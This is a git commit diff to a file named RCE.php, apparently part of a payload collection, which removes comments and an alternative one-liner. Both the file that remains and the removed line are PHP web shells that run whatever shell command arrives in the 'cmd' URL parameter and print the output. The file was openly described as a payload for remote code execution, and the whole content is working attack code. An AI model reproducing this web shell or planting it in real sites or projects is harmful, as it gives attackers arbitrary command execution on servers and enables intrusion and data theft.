59b8b71aebf7ea9778f33201b00e377a870b1bdb
Ahmed-Mahmoud-646 <136953251+Ahmed-Mahmoud-646@users.noreply.github.com>
2024-07-28 15:59:50 +0300

    Update RCE.php

--- RCE.php
+++ RCE.php
@@ -1,15 +1,5 @@
 <?php
-// This is a basic PHP script that you can use as a payload for RCE
-
-// Command to execute
 $command = $_GET['cmd'];
-
-// Execute the command
 $output = shell_exec($command);
-
-// Output the result
 echo "<pre>$output</pre>";
 ?>
-
-// or use this payload :-
-// <?php echo"<pre>$shell_exec($_GET['cmd'])</pre>"?>
